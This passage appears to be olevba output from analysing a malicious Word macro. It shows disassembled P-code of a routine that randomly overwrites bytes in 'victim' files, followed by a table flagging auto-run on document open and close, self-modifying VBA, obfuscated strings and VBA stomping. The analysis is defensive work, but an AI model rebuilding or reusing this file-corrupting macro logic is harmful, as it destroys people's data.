' 	Ld FileNumber 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	While 
' Line #138:
' 	Ld pos 
' 	LitDI2 0x0001 
' 	Add 
' 	St pos 
' Line #139:
' 	Ld FileNumber 
' 	Sharp 
' 	Ld pos 
' 	Ld zw 
' 	GetRec 
' Line #140:
' 	Ld Rnd 
' 	LitR8 0x6666 0x6666 0x6666 0x3FD6 
' 	Gt 
' 	Paren 
' 	Ld FileNumber 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #141:
' 	LitDI2 0x0100 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St zw 
' Line #142:
' 	Ld FileNumber 
' 	Sharp 
' 	Ld pos 
' 	Ld zw 
' 	PutRec 
' Line #143:
' 	EndIfBlock 
' Line #144:
' 	Wend 
' Line #145:
' 	Ld FileNumber 
' 	Sharp 
' 	Close 0x0001 
' Line #146:
' 	Label exit_ 
' 	Resume h 
' Line #147:
' 	Label h 
' Line #148:
' 	StartForVariable 
' 	Ld p_number 
' 	EndForVariable 
' 	NextVar 
' Line #149:
' 	StartForVariable 
' 	Ld vic_ext 
' 	EndForVariable 
' 	NextVar 
' Line #150:
' 	StartForVariable 
' 	Ld vic_name 
' 	EndForVariable 
' 	NextVar 
' Line #151:
' 	EndIfBlock 
' Line #152:
' 	StartForVariable 
' 	Ld en 
' 	EndForVariable 
' 	NextVar 
' Line #153:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

